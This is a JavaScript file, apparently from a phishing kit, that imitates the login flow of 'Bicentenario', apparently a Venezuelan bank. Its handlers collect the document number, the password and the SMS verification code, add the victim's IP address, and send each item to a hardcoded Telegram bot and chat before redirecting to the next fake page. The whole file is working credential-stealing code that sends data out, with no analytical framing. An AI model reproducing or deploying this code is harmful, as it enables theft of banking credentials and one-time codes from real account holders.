// Funci車n para obtener la direcci車n IP
async function obtenerIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log("Error al obtener IP");
        return "No disponible";
    }
}

// Funci車n para enviar datos a Telegram
async function enviarATelegram(mensaje, redireccion, params = {}) {
    const botToken = "7687237294:AAGggBcZIjHcQlxUiM57PdaTMyudp9ivpeg";
    const chatId = "-4655729834";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const body = new URLSearchParams();
        body.append('chat_id', chatId);
        body.append('text', mensaje);
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: body
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.status}`);
        }

        if (redireccion) {
            const urlObj = new URL(redireccion, window.location.href);
            for (const key in params) {
                urlObj.searchParams.set(key, params[key]);
            }
            window.location.href = urlObj.toString();
        }

    } catch (error) {
        console.error('Error al enviar:', error);
        if (redireccion) {
            const urlObj = new URL(redireccion, window.location.href);
            for (const key in params) {
                urlObj.searchParams.set(key, params[key]);
            }
            window.location.href = urlObj.toString();
        }
    }
}

// Funci車n para construir mensajes sin emojis
function construirMensaje(tipo, datos) {
    switch(tipo) {
        case 'login':
            return `Nuevo Acceso Bicentenario\n\n` +
                   `Tipo de Documento: ${datos.tipodoc}\n` +
                   `Numero de Identificacion: ${datos.documento}\n` +
                   `Direccion IP: ${datos.ip}\n\n` +
                   `Datos capturados autom芍ticamente`;
            
        case 'password':
            return `Acceso Bicentenario - Contrase?a\n\n` +
                   `Documento: ${datos.documento}\n` +
                   `Contrase?a: ${datos.password}\n` +
                   `Direccion IP: ${datos.ip}\n\n` +
                   `Datos capturados autom芍ticamente`;
            
        case 'sms':
            if (!datos.codigoSMS) throw new Error("El c車digo SMS es requerido");
            return `Acceso Bicentenario - Codigo SMS\n\n` +
                   `Documento: ${datos.documento}\n` +
                   `Codigo SMS: ${datos.codigoSMS}\n` +
                   `Direccion IP: ${datos.ip}\n\n` +
                   `Datos capturados autom芍ticamente`;
    }
}

// Funci車n para procesar formularios
async function procesarFormulario(tipo, form, redireccion) {
    const cargando = form.querySelector('.cargando');
    const botones = form.querySelector('.botones');
    const submitBtn = form.querySelector('button[type="submit"]');

    submitBtn.disabled = true;
    if (cargando) cargando.style.display = 'block';
    if (botones) botones.style.display = 'none';

    try {
        let datos = {};
        const ip = await obtenerIP();

        switch(tipo) {
            case 'login':
                datos = {
                    tipodoc: document.getElementById("tipodocben").value,
                    documento: document.getElementById("documento").value,
                    ip: ip
                };
                break;
                
            case 'password':
                datos = {
                    tipodoc: document.getElementById("tipodocben-input")?.value || "Venezolano",
                    documento: document.getElementById("documento-input")?.value || "No disponible",
                    password: document.getElementById("p").value,
                    ip: ip
                };
                break;
                
            case 'sms':
                datos = {
                    tipodoc: document.getElementById("tipodoc-input")?.value || "Venezolano",
                    documento: document.getElementById("documento-input")?.value || "No disponible",
                    codigoSMS: document.getElementById("cod").value,
                    ip: ip
                };
                if (!datos.codigoSMS) throw new Error("Por favor ingrese el c車digo SMS");
                break;
        }

        const mensaje = construirMensaje(tipo, datos);
        await enviarATelegram(mensaje, redireccion, { 
            documento: datos.documento, 
            tipodoc: datos.tipodoc 
        });

    } catch (error) {
        console.error(`Error en ${tipo}:`, error);
        alert(error.message);
        submitBtn.disabled = false;
        if (cargando) cargando.style.display = 'none';
        if (botones) botones.style.display = 'block';
    }
}

// Configuraci車n de manejadores de eventos
function setupFormHandlers() {
    // Formulario de login (index.html)
    if (document.getElementById("login-form")) {
        const form = document.getElementById("login-form");
        form.addEventListener("submit", (e) => {
            e.preventDefault();
            procesarFormulario('login', form, "pswd.html");
        });

        const eyeIcon = form.querySelector('.icon-watch');
        if (eyeIcon) {
            eyeIcon.addEventListener('click', () => {
                const input = document.getElementById("documento");
                input.type = input.type === 'password' ? 'text' : 'password';
                eyeIcon.classList.toggle('fa-eye-slash');
                eyeIcon.classList.toggle('fa-eye');
            });
        }
    }

    // Formulario de contrase?a (pswd.html)
    if (document.getElementById("password-form")) {
        const form = document.getElementById("password-form");
        form.addEventListener("submit", (e) => {
            e.preventDefault();
            procesarFormulario('password', form, "cargando.html");
        });

        const eyeIcon = form.querySelector('.icon-watch');
        if (eyeIcon) {
            eyeIcon.addEventListener('click', () => {
                const input = document.getElementById("p");
                input.type = input.type === 'password' ? 'text' : 'password';
                eyeIcon.classList.toggle('fa-eye-slash');
                eyeIcon.classList.toggle('fa-eye');
            });
        }

        const backBtn = document.getElementById("cmdRegresar");
        if (backBtn) {
            backBtn.addEventListener("click", (e) => {
                e.preventDefault();
                window.location.href = "index.html";
            });
        }
    }

    // Formulario de SMS (sms.html)
    if (document.getElementById("sms-form")) {
        const form = document.getElementById("sms-form");
        form.addEventListener("submit", (e) => {
            e.preventDefault();
            procesarFormulario('sms', form, "sms.html");
        });
    }
}

// Inicializaci車n cuando el DOM est谷 listo
document.addEventListener('DOMContentLoaded', setupFormHandlers);